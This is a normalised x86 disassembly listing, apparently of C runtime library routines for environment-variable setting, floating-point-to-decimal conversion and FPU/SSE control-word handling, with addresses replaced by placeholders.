mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
push esi
mov esi 0x7fffffff
cmp edx esi
jbe r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x10 ]
cmp ecx ebx
jne r-xdata
call sub_410cee
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_40edf4
add esp 0x14
jmp r-xdata
push [ eax + 0x8 ]
lea eax [ ebp - 0x10 ]
push edx
push [ ebp + 0xc ]
push edx
push [ ebp + 0x8 ]
push 0x1001
push ecx
push eax
call sub_41f087
add esp 0x20
cmp eax ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40e67f
add esp 0x10
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
add eax 0xfffffffe
call sub_410cee
mov [ eax ] 0x16
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop esi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_41f1c3
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ rw-data ]
jmp r-xdata
mov eax [ esi ]
test eax eax
jne r-xdata
push edi
push eax
push [ ebp + 0x8 ]
call sub_41e1dc
add esp 0xc
test eax eax
jne r-xdata
mov eax esi
sub eax [ rw-data ]
sar eax 0x2
neg eax
add esi 0x4
mov eax [ esi ]
mov al [ edi + eax ]
cmp al 0x3d
je r-xdata
mov eax esi
sub eax [ rw-data ]
sar eax 0x2
jmp r-xdata
test al al
je r-xdata
pop esi
pop ebp
retn
sub_41f215
mov edi edi
push ebp
mov ebp esp
push ecx
push edi
mov edi eax
xor eax eax
mov ecx edi
test edi edi
je r-xdata
pop edi
leave
retn
cmp [ edi ] eax
je r-xdata
push esi
inc eax
push 0x4
push eax
call sub_413f18
mov esi eax
pop ecx
pop ecx
mov [ ebp - 0x4 ] esi
test esi esi
jne r-xdata
add ecx 0x4
inc eax
cmp [ ecx ] 0x0
jne r-xdata
mov eax [ edi ]
test eax eax
jne r-xdata
push 0x9
call sub_4140d7
jmp r-xdata
push eax
call sub_42021b
mov [ esi ] eax
add esi 0x4
add edi 0x4
and [ esi ] eax
mov eax [ ebp - 0x4 ]
pop esi
pop ecx
sub_41f26f
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
mov eax [ ebp + 0x8 ]
push ebx
xor ebx ebx
mov [ ebp - 0xc ] ebx
cmp eax ebx
jne r-xdata
push esi
mov esi [ eax ]
push edi
mov [ ebp - 0x4 ] esi
cmp esi ebx
je r-xdata
call sub_410cee
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_40edf4
add esp 0x14
or eax 0xffffffff
jmp r-xdata
call sub_410cee
mov [ eax ] 0x16
push 0x3d
push esi
call sub_42032c
mov edi eax
pop ecx
pop ecx
mov [ ebp - 0x14 ] edi
cmp edi ebx
je r-xdata
pop ebx
leave
retn
cmp esi edi
je r-xdata
xor eax eax
cmp [ edi + 0x1 ] bl
sete al
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
cmp eax [ rw-data ]
jne r-xdata
cmp eax ebx
jne r-xdata
call sub_41f215
mov [ rw-data ] eax
mov esi [ rw-data ]
mov [ ebp - 0x10 ] esi
cmp esi ebx
je r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
or eax 0xffffffff
sub edi [ ebp - 0x4 ]
push [ ebp - 0x4 ]
call sub_41f1c3
mov edi eax
cmp edi ebx
pop ecx
jl r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
cmp [ rw-data ] ebx
je r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
cmp [ esi ] ebx
je r-xdata
xor eax eax
jmp r-xdata
push 0x4
call sub_413ed3
pop ecx
mov [ rw-data ] eax
cmp eax ebx
je r-xdata
call sub_41e1f6
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call sub_410135
mov eax [ ebp + 0x8 ]
pop ecx
mov [ eax ] ebx
cmp edi ebx
jge r-xdata
lea esi [ esi + edi * 4 ]
push [ esi ]
call sub_410135
pop ecx
cmp [ ebp - 0x8 ] ebx
jne r-xdata
pop edi
pop esi
mov [ eax ] ebx
cmp [ rw-data ] ebx
jne r-xdata
lea eax [ edi + 0x2 ]
cmp eax edi
jl r-xdata
neg edi
cmp [ esi ] ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov [ eax ] ebx
jmp r-xdata
push 0x4
call sub_413ed3
pop ecx
mov [ rw-data ] eax
cmp eax ebx
je r-xdata
cmp eax 0x3fffffff
jae r-xdata
mov eax [ esi + 0x4 ]
mov [ esi ] eax
mov eax [ ebp - 0x10 ]
inc edi
lea esi [ eax + edi * 4 ]
cmp edi 0x3fffffff
jae r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
mov [ eax ] ebx
push eax
push 0x4
push [ rw-data ]
call sub_413fb2
add esp 0xc
cmp eax ebx
je r-xdata
push 0x4
push edi
push [ rw-data ]
call sub_413fb2
add esp 0xc
cmp eax ebx
je r-xdata
cmp [ ebp - 0x8 ] ebx
je r-xdata
mov esi [ ebp - 0x4 ]
push 0x1
push esi
call sub_410680
inc eax
pop ecx
inc eax
push eax
call sub_413f18
mov edi eax
pop ecx
pop ecx
cmp edi ebx
je r-xdata
mov edx [ ebp - 0x4 ]
lea ecx [ eax + edi * 4 ]
mov [ ecx ] edx
mov [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
mov [ ecx ] ebx
jmp r-xdata
mov eax [ ebp - 0xc ]
jmp r-xdata
push [ ebp - 0x4 ]
call sub_410135
mov eax [ ebp + 0x8 ]
pop ecx
mov [ eax ] ebx
push esi
push esi
call sub_410680
inc eax
pop ecx
inc eax
push eax
push edi
call sub_413c11
add esp 0xc
test eax eax
je r-xdata
mov [ rw-data ] eax
mov ecx [ ebp - 0x8 ]
mov eax edi
sub eax esi
add eax [ ebp - 0x14 ]
mov [ eax ] bl
inc eax
neg ecx
sbb ecx ecx
not ecx
and ecx eax
push ecx
push edi
call [ SetEnvironmentVariableA@IAT ]
test eax eax
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_40eccc
add esp 0x14
push edi
call sub_410135
pop ecx
or [ ebp - 0xc ] 0xffffffff
call sub_410cee
mov [ eax ] 0x2a
sub_41f4ba
mov edi edi
push ebp
mov ebp esp
sub esp 0x74
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x1c ]
push esi
push edi
lea esi [ ebp + 0x8 ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov edx [ ebp - 0x8 ]
mov ecx edx
mov eax 0x8000
and ecx eax
and edx 0x7fff
mov [ ebp - 0x60 ] ebx
mov [ ebp - 0x30 ] 0xcc
mov [ ebp - 0x2f ] 0xcc
mov [ ebp - 0x2e ] 0xcc
mov [ ebp - 0x2d ] 0xcc
mov [ ebp - 0x2c ] 0xcc
mov [ ebp - 0x2b ] 0xcc
mov [ ebp - 0x2a ] 0xcc
mov [ ebp - 0x29 ] 0xcc
mov [ ebp - 0x28 ] 0xcc
mov [ ebp - 0x27 ] 0xcc
mov [ ebp - 0x26 ] 0xfb
mov [ ebp - 0x25 ] 0x3f
mov [ ebp - 0x74 ] 0x1
mov [ ebp - 0x70 ] ecx
test cx cx
je r-xdata
mov [ ebx + 0x2 ] 0x20
mov [ ebx + 0x2 ] 0x2d
jmp r-xdata
mov eax 0x7fff
cmp dx ax
jne r-xdata
test esi esi
jne r-xdata
mov esi [ ebp - 0xc ]
mov edi [ ebp - 0x10 ]
test dx dx
jne r-xdata
movzx ecx dx
mov ebx ecx
imul ecx ecx 0x4d10
shr ebx 0x8
mov eax esi
shr eax 0x18
lea eax [ ebx + eax * 2 ]
imul eax eax 0x4d
lea eax [ eax + ecx - 0x134312f4 ]
sar eax 0x10
movzx eax ax
xor ecx ecx
movsx ebx ax
mov [ ebp - 0x20 ] cx
mov ecx rw-data
neg ebx
sub ecx 0x60
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x16 ] dx
mov [ ebp - 0x1a ] esi
mov [ ebp - 0x1e ] edi
mov [ ebp - 0x64 ] ecx
test ebx ebx
je r-xdata
xor eax eax
inc eax
mov [ ebx ] ax
mov eax 0x80000000
cmp esi eax
jne r-xdata
test edi edi
jne r-xdata
mov ecx [ ebp - 0x18 ]
shr ecx 0x10
mov edx 0x3fff
mov eax 0x7fff
cmp cx dx
jb r-xdata
jge r-xdata
test esi 0x40000000
jne r-xdata
test edi edi
je r-xdata
xor edx edx
cmp cx ax
setne al
dec al
and al 0xd
add al 0x20
mov [ ebx ] dx
mov [ ebx + 0x2 ] al
mov [ ebx + 0x3 ] 0x1
mov [ ebx + 0x4 ] 0x30
mov [ ebx + 0x5 ] dl
test [ ebp + 0x18 ] 0x1
mov edx [ ebp - 0x60 ]
mov eax [ ebp - 0x4c ]
mov edi [ ebp + 0x14 ]
mov [ edx ] ax
je r-xdata
inc [ ebp - 0x4c ]
xor edx edx
mov [ ebp - 0x50 ] edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] edx
mov edx [ ebp - 0x26 ]
movzx ecx cx
mov ebx edx
xor ebx ecx
and ecx eax
and edx eax
and ebx 0x8000
mov edi eax
lea esi [ edx + ecx ]
mov [ ebp - 0x5c ] ebx
movzx esi si
cmp cx di
jae r-xdata
test ebx ebx
je r-xdata
mov eax rw-data
neg ebx
sub eax 0x60
mov [ ebp - 0x64 ] eax
test cx cx
je r-xdata
push r--data
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40e1e0
leave
retn
cmp edi 0x15
jle r-xdata
cwde
add edi eax
test edi edi
jg r-xdata
xor eax eax
test bx bx
sete al
and [ ebp - 0x1c ] 0x0
dec eax
and eax 0x80000000
add eax 0x7fff8000
and [ ebp - 0x20 ] 0x0
cmp dx ax
jae r-xdata
add [ ebp - 0x64 ] 0x54
mov ecx ebx
and ecx 0x7
sar ebx 0x3
test ecx ecx
je r-xdata
cmp esi eax
jne r-xdata
cmp esi 0xc0000000
jne r-xdata
lea eax [ ebx + 0x4 ]
push 0x16
push eax
call sub_413c11
add esp 0xc
xor esi esi
test eax eax
je r-xdata
mov esi [ ebp - 0x18 ]
shr esi 0x10
sub esi 0x3ffe
xor eax eax
mov [ ebp - 0x16 ] ax
mov [ ebp - 0x44 ] 0x8
push 0x15
pop edi
xor eax eax
mov [ edx ] ax
mov eax 0x8000
cmp [ ebp - 0x70 ] ax
mov [ edx + 0x3 ] 0x1
setne al
dec al
and al 0xd
add al 0x20
mov [ edx + 0x2 ] al
mov [ edx + 0x4 ] 0x30
mov [ edx + 0x5 ] 0x0
jmp r-xdata
mov eax 0xbffd
cmp si ax
ja r-xdata
xor esi esi
imul ecx ecx 0xc
add ecx [ ebp - 0x64 ]
mov eax ecx
mov [ ebp - 0x44 ] ecx
mov ecx 0x8000
cmp [ eax ] cx
jb r-xdata
push r--data
test edi edi
jne r-xdata
test edi edi
jne r-xdata
mov [ ebx + 0x3 ] 0x6
push esi
push esi
push esi
push esi
push esi
call sub_40eccc
add esp 0x14
mov eax [ ebp - 0x20 ]
mov ebx [ ebp - 0x1c ]
mov ecx [ ebp - 0x1c ]
shl [ ebp - 0x20 ] 0x1
shr eax 0x1f
add ebx ebx
or ebx eax
mov eax [ ebp - 0x18 ]
shr ecx 0x1f
add eax eax
or eax ecx
dec [ ebp - 0x44 ]
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x18 ] eax
jne r-xdata
test esi esi
jge r-xdata
xor eax eax
inc eax
jmp r-xdata
mov eax 0x3fbf
cmp si ax
ja r-xdata
movzx edx [ eax + 0xa ]
xor ecx ecx
mov [ ebp - 0x54 ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp - 0x16 ]
mov esi edx
xor esi ecx
and esi 0x8000
mov [ ebp - 0x48 ] esi
mov esi 0x7fff
and ecx esi
and edx esi
lea esi [ edx + ecx ]
movzx edi si
mov esi 0x7fff
cmp cx si
jae r-xdata
mov esi eax
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
dec [ ebp - 0x3a ]
mov [ ebp - 0x44 ] eax
push r--data
push r--data
jmp r-xdata
lea eax [ edi + 0x1 ]
lea ebx [ edx + 0x4 ]
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x4c ] eax
test eax eax
jle r-xdata
neg esi
and esi 0xff
jle r-xdata
xor eax eax
cmp cx ax
jne r-xdata
xor eax eax
xor eax eax
xor esi esi
cmp [ ebp - 0x48 ] si
sete al
dec eax
and eax 0x80000000
add eax 0x7fff8000
mov [ ebp - 0x18 ] eax
jmp r-xdata
cmp dx si
jae r-xdata
mov [ ebx + 0x3 ] 0x5
jmp r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_40eccc
add esp 0x14
lea eax [ ebx + 0x4 ]
push 0x16
push eax
call sub_413c11
add esp 0xc
xor esi esi
test eax eax
je r-xdata
dec ebx
mov al [ ebx ]
dec ebx
cmp al 0x35
jge r-xdata
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x1c ]
lea esi [ ebp - 0x20 ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
shl [ ebp - 0x20 ] 0x1
mov edi [ ebp - 0x20 ]
shl [ ebp - 0x20 ] 0x1
shr edx 0x1f
lea ecx [ eax + eax ]
or ecx edx
mov edx [ ebp - 0x18 ]
mov esi eax
shr esi 0x1f
add edx edx
or edx esi
mov eax ecx
lea esi [ ecx + ecx ]
shr eax 0x1f
lea ecx [ edx + edx ]
mov edx [ ebp - 0x3c ]
shr edi 0x1f
or ecx eax
mov eax [ ebp - 0x20 ]
or esi edi
lea edi [ edx + eax ]
cmp edi eax
jb r-xdata
mov eax [ ebp - 0x18 ]
mov ebx [ ebp - 0x1c ]
mov ecx [ ebp - 0x1c ]
shr [ ebp - 0x18 ] 0x1
shl eax 0x1f
shr ebx 0x1
or ebx eax
mov eax [ ebp - 0x20 ]
shl ecx 0x1f
shr eax 0x1
or eax ecx
dec esi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x20 ] eax
test esi esi
jg r-xdata
cmp dx ax
jne r-xdata
inc esi
test [ ebp - 0x18 ] 0x7fffffff
jne r-xdata
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x20 ] esi
jmp r-xdata
mov esi 0xbffd
cmp di si
ja r-xdata
xor eax eax
jmp r-xdata
cmp ebx [ ebp - 0x40 ]
jae r-xdata
mov ecx [ ebp - 0x40 ]
jmp r-xdata
lea eax [ esi + 0x1 ]
xor edx edx
cmp eax esi
jb r-xdata
cmp edi edx
jae r-xdata
mov [ ebp - 0x58 ] eax
lea edi [ ebp - 0xc ]
mov [ ebp - 0x40 ] 0x5
inc esi
test [ ebp - 0x28 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x1c ] eax
jne r-xdata
cmp ebx esi
jne r-xdata
mov esi 0x3fbf
cmp di si
ja r-xdata
cmp [ ebx ] 0x39
jne r-xdata
mov eax [ ebp - 0x60 ]
cmp ebx [ ebp - 0x40 ]
jae r-xdata
cmp ebx ecx
jae r-xdata
xor edx edx
inc edx
cmp eax 0x1
jae r-xdata
mov eax [ ebp - 0x38 ]
lea edx [ eax + esi ]
mov [ ebp - 0x44 ] edx
cmp edx esi
jb r-xdata
inc edi
inc edi
inc [ ebp - 0x58 ]
dec [ ebp - 0x40 ]
cmp [ ebp - 0x40 ] 0x0
jg r-xdata
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x48 ] ecx
lea eax [ ebp + eax - 0x20 ]
cmp [ ebp - 0x2c ] eax
jne r-xdata
cmp [ ebp - 0x20 ] eax
jne r-xdata
xor esi esi
cmp cx si
jne r-xdata
xor esi esi
mov [ ebx ] 0x30
dec ebx
inc [ ebx ]
inc ebx
inc [ eax ]
cmp [ ebx ] 0x30
jne r-xdata
mov eax [ ebp - 0x60 ]
cmp ebx ecx
jae r-xdata
inc ecx
mov esi eax
test edx edx
je r-xdata
inc ecx
cmp edx eax
jae r-xdata
mov eax [ ebp - 0x58 ]
mov ecx [ ebp - 0x40 ]
add eax eax
mov [ ebp - 0x54 ] ecx
test ecx ecx
jle r-xdata
add esi 0xc002
test si si
jle r-xdata
mov [ ebp - 0x44 ] 0x1
cmp ebx ecx
jae r-xdata
cmp [ ebp - 0x30 ] eax
je r-xdata
mov [ ebp - 0x16 ] ax
jmp r-xdata
cmp dx si
jne r-xdata
inc edi
test [ ebp - 0x18 ] 0x7fffffff
jne r-xdata
dec ebx
sub bl al
sub bl 0x3
movsx ecx bl
mov [ eax + 0x3 ] bl
mov [ ecx + eax + 0x4 ] 0x0
mov eax [ ebp - 0x74 ]
xor edx edx
mov [ eax ] dx
mov edx 0x8000
cmp [ ebp - 0x70 ] dx
mov [ eax + 0x3 ] 0x1
setne dl
dec dl
and dl 0xd
add dl 0x20
mov [ eax + 0x2 ] dl
mov [ ecx ] 0x30
mov [ eax + 0x5 ] 0x0
jmp r-xdata
add ecx [ ebp - 0x34 ]
shr edx 0x1f
add ecx ecx
or ecx edx
lea esi [ edi + edi ]
mov [ ebp - 0x20 ] esi
mov esi [ ebp - 0x44 ]
mov [ ebp - 0x18 ] ecx
shr ecx 0x18
add esi esi
add cl 0x30
mov eax edi
shr eax 0x1f
or esi eax
mov [ ebx ] cl
inc ebx
dec [ ebp - 0x4c ]
cmp [ ebp - 0x4c ] 0x0
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x15 ] 0x0
jg r-xdata
add esi 0xffff
test si si
jge r-xdata
mov edi [ ebp - 0x8 ]
test edi edi
js r-xdata
sub [ ebp - 0x48 ] 0x2
inc eax
inc eax
dec [ ebp - 0x54 ]
cmp [ ebp - 0x54 ] 0x0
jg r-xdata
inc [ edi ]
cmp [ ebp - 0x44 ] 0x0
mov [ edi - 0x4 ] ebx
je r-xdata
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x20 ] eax
jmp r-xdata
and [ ebp - 0x58 ] esi
lea esi [ ebp - 0xc ]
mov [ ebp - 0x40 ] 0x5
inc edi
test [ eax + 0x8 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x1c ] esi
jne r-xdata
mov eax 0x8000
mov ecx eax
cmp [ ebp - 0x10 ] cx
ja r-xdata
mov eax esi
neg eax
movzx eax ax
add esi eax
test si si
jg r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x10 ]
shl [ ebp - 0x10 ] 0x1
mov edx eax
add eax eax
shr ecx 0x1f
or eax ecx
mov [ ebp - 0xc ] eax
shr edx 0x1f
lea eax [ edi + edi ]
or eax edx
add esi 0xffff
mov [ ebp - 0x8 ] eax
test si si
jg r-xdata
mov ecx [ ebp - 0x48 ]
movzx edx [ eax ]
movzx ecx [ ecx ]
and [ ebp - 0x44 ] 0x0
imul ecx edx
mov edx [ edi - 0x4 ]
lea ebx [ edx + ecx ]
cmp ebx edx
jb r-xdata
inc esi
inc esi
inc [ ebp - 0x58 ]
dec [ ebp - 0x40 ]
cmp [ ebp - 0x40 ] 0x0
jg r-xdata
lea ecx [ ebp + ecx - 0x20 ]
add eax 0x8
mov [ ebp - 0x6c ] ecx
mov [ ebp - 0x68 ] eax
cmp [ eax + 0x4 ] esi
jne r-xdata
cmp [ ebp - 0x20 ] esi
jne r-xdata
cmp [ ebp - 0xe ] 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x10 ]
and ecx 0x1ffff
cmp ecx 0x18000
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edi [ ebp - 0xc ]
mov edx [ ebp - 0xc ]
shr [ ebp - 0x8 ] 0x1
shl ecx 0x1f
shr edi 0x1
or edi ecx
mov ecx [ ebp - 0x10 ]
shl edx 0x1f
shr ecx 0x1
or ecx edx
dec eax
mov [ ebp - 0xc ] edi
mov [ ebp - 0x10 ] ecx
jne r-xdata
inc [ ebp - 0x50 ]
mov ecx [ ebp - 0x58 ]
mov edx [ ebp - 0x40 ]
add ecx ecx
mov [ ebp - 0x50 ] edx
test edx edx
jle r-xdata
add edi 0xc002
test di di
jle r-xdata
mov [ ebp - 0x5c ] 0x1
cmp eax ecx
jae r-xdata
cmp [ eax ] esi
je r-xdata
xor eax eax
mov [ ebp - 0x16 ] ax
jmp r-xdata
inc [ ebp - 0xe ]
and [ ebp - 0xe ] 0x0
cmp [ ebp - 0xa ] 0xffffffff
jne r-xdata
mov eax 0x7fff
cmp si ax
jb r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
cmp [ ebp - 0x50 ] eax
je r-xdata
add edi 0xffff
test di di
jge r-xdata
test [ ebp - 0x8 ] 0x80000000
jne r-xdata
add [ ebp - 0x6c ] 0x2
sub [ ebp - 0x68 ] 0x2
dec [ ebp - 0x50 ]
cmp [ ebp - 0x50 ] 0x0
jg r-xdata
inc [ esi ]
cmp [ ebp - 0x5c ] 0x0
mov [ esi - 0x4 ] eax
je r-xdata
mov [ ebp - 0x18 ] esi
mov ax [ ebp - 0xe ]
or esi [ ebp - 0x5c ]
mov [ ebp - 0x20 ] ax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x1e ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x1a ] eax
mov [ ebp - 0x16 ] si
jmp r-xdata
xor eax eax
xor ecx ecx
cmp [ ebp - 0x5c ] ax
mov [ ebp - 0x1c ] eax
sete cl
mov [ ebp - 0x20 ] eax
dec ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x18 ] ecx
jmp r-xdata
inc [ ebp - 0xa ]
jmp r-xdata
and [ ebp - 0xa ] 0x0
mov ecx 0xffff
cmp [ ebp - 0x6 ] cx
jne r-xdata
or [ ebp - 0x10 ] 0x1
mov eax 0x8000
mov ecx eax
cmp [ ebp - 0x10 ] cx
ja r-xdata
mov eax edi
neg eax
movzx eax ax
add edi eax
test di di
jg r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x10 ]
shl [ ebp - 0x10 ] 0x1
mov edx eax
add eax eax
shr ecx 0x1f
or eax ecx
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
shr edx 0x1f
add eax eax
or eax edx
add edi 0xffff
mov [ ebp - 0x8 ] eax
test di di
jg r-xdata
mov eax [ ebp - 0x6c ]
movzx ecx [ eax ]
mov eax [ ebp - 0x68 ]
movzx eax [ eax ]
mov edx [ esi - 0x4 ]
imul ecx eax
and [ ebp - 0x5c ] 0x0
lea eax [ edx + ecx ]
cmp eax edx
jb r-xdata
mov eax [ ebp - 0x44 ]
inc [ ebp - 0x6 ]
jmp r-xdata
mov [ ebp - 0x6 ] ax
inc esi
jmp r-xdata
cmp [ ebp - 0xe ] 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x10 ]
and ecx 0x1ffff
cmp ecx 0x18000
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov esi [ ebp - 0xc ]
mov edx [ ebp - 0xc ]
shr [ ebp - 0x8 ] 0x1
shl ecx 0x1f
shr esi 0x1
or esi ecx
mov ecx [ ebp - 0x10 ]
shl edx 0x1f
shr ecx 0x1
or ecx edx
dec eax
mov [ ebp - 0xc ] esi
mov [ ebp - 0x10 ] ecx
jne r-xdata
inc [ ebp - 0x54 ]
inc [ ebp - 0xe ]
and [ ebp - 0xe ] 0x0
cmp [ ebp - 0xa ] 0xffffffff
jne r-xdata
mov eax 0x7fff
cmp di ax
jb r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
cmp [ ebp - 0x54 ] eax
je r-xdata
mov ax [ ebp - 0xe ]
or edi [ ebp - 0x48 ]
mov [ ebp - 0x20 ] ax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x1e ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x1a ] eax
mov [ ebp - 0x16 ] di
jmp r-xdata
xor eax eax
xor ecx ecx
cmp [ ebp - 0x48 ] ax
mov [ ebp - 0x1c ] eax
sete cl
mov [ ebp - 0x20 ] eax
dec ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x18 ] ecx
inc [ ebp - 0xa ]
jmp r-xdata
and [ ebp - 0xa ] 0x0
mov ecx 0xffff
cmp [ ebp - 0x6 ] cx
jne r-xdata
or [ ebp - 0x10 ] 0x1
inc [ ebp - 0x6 ]
jmp r-xdata
mov [ ebp - 0x6 ] ax
inc edi
jmp r-xdata
sub_41fdde
xor eax eax
test bl 0x10
je r-xdata
test bl 0x8
je r-xdata
inc eax
test bl 0x4
je r-xdata
or eax 0x4
test bl 0x2
je r-xdata
or eax 0x8
test bl 0x1
je r-xdata
or eax 0x10
test ebx 0x80000
je r-xdata
or eax 0x20
mov ecx ebx
mov edx 0x300
and ecx edx
push esi
mov esi 0x200
je r-xdata
or eax 0x2
mov ecx ebx
and ecx 0x30000
je r-xdata
cmp ecx 0x100
je r-xdata
or eax edx
cmp ecx 0x10000
jne r-xdata
or eax 0x400
cmp ecx esi
je r-xdata
retn
or eax 0x1000
pop esi
test ebx 0x40000
je r-xdata
or eax esi
jmp r-xdata
or eax 0x800
jmp r-xdata
cmp ecx edx
jne r-xdata
or eax 0xc00
jmp r-xdata
sub_41fe6c
xor eax eax
test dl 0x10
je r-xdata
push ebx
push esi
push edi
mov ebx 0x200
test dl 0x8
je r-xdata
mov eax 0x80
test dl 0x4
je r-xdata
or eax ebx
test dl 0x2
je r-xdata
or eax 0x400
test dl 0x1
je r-xdata
or eax 0x800
mov edi 0x100
test edx 0x80000
je r-xdata
or eax 0x1000
mov ecx edx
mov esi 0x300
and ecx esi
je r-xdata
or eax edi
mov ecx 0x3000000
pop edi
and edx ecx
pop esi
pop ebx
cmp edx 0x1000000
je r-xdata
cmp ecx edi
je r-xdata
or eax 0x8040
cmp edx 0x2000000
je r-xdata
or eax 0x2000
cmp ecx ebx
je r-xdata
or eax 0x40
retn
cmp edx ecx
jne r-xdata
or eax 0x4000
jmp r-xdata
cmp ecx esi
jne r-xdata
retn
or eax 0x8000
retn
or eax 0x6000
jmp r-xdata
sub_41ff0c
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
push edi
fwait
fnstcw [ ebp - 0x8 ]
mov ebx [ ebp - 0x8 ]
xor edx edx
test bl 0x1
je r-xdata
test bl 0x4
je r-xdata
push 0x10
pop edx
test bl 0x8
je r-xdata
or edx 0x8
test bl 0x10
je r-xdata
or edx 0x4
test bl 0x20
je r-xdata
or edx 0x2
test bl 0x2
je r-xdata
or edx 0x1
movzx ecx bx
mov eax ecx
mov esi 0xc00
and eax esi
mov edi 0x300
je r-xdata
or edx 0x80000
and ecx edi
je r-xdata
cmp eax 0x400
je r-xdata
or edx 0x20000
cmp ecx 0x200
jne r-xdata
or edx 0x100
cmp eax 0x800
je r-xdata
mov edi [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov eax edi
not eax
and eax edx
and ecx edi
or eax ecx
mov [ ebp + 0xc ] eax
cmp eax edx
je r-xdata
or edx 0x40000
test ebx 0x1000
je r-xdata
or edx 0x10000
jmp r-xdata
or edx 0x200
jmp r-xdata
cmp eax esi
jne r-xdata
xor esi esi
cmp [ rw-data ] esi
je r-xdata
mov ebx eax
call sub_41fdde
movzx eax ax
mov [ ebp - 0x4 ] eax
fldcw [ ebp - 0x4 ]
fwait
fnstcw [ ebp - 0x4 ]
mov ebx [ ebp - 0x4 ]
xor edx edx
test bl 0x1
je r-xdata
or edx edi
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
and edi 0x308031f
mov [ ebp - 0x14 ] edi
stmxcsr [ ebp - 0x10 ]
mov eax [ ebp - 0x10 ]
test al al
jns r-xdata
test bl 0x4
je r-xdata
push 0x10
pop edx
test eax 0x200
je r-xdata
push 0x10
pop esi
test bl 0x8
je r-xdata
or edx 0x8
test eax 0x400
je r-xdata
or esi 0x8
test bl 0x10
je r-xdata
or edx 0x4
test eax 0x800
je r-xdata
or esi 0x4
test bl 0x20
je r-xdata
or edx 0x2
test eax 0x1000
je r-xdata
or esi 0x2
test bl 0x2
je r-xdata
or edx 0x1
test eax 0x100
je r-xdata
or esi 0x1
movzx ecx bx
mov eax ecx
and eax esi
je r-xdata
or edx 0x80000
mov ecx eax
mov ebx 0x6000
and ecx ebx
je r-xdata
or esi 0x80000
and ecx 0x300
je r-xdata
cmp eax 0x400
je r-xdata
mov edi 0x8040
and eax edi
sub eax 0x40
je r-xdata
cmp ecx 0x2000
je r-xdata
or edx 0x20000
cmp ecx 0x200
jne r-xdata
or edx 0x100
cmp eax 0x800
je r-xdata
or esi 0x2000000
sub eax 0x7fc0
je r-xdata
or esi 0x100
cmp ecx 0x4000
je r-xdata
mov [ ebp + 0xc ] edx
mov eax edx
or edx 0x40000
test ebx 0x1000
je r-xdata
or edx 0x10000
jmp r-xdata
or edx 0x200
jmp r-xdata
cmp eax esi
jne r-xdata
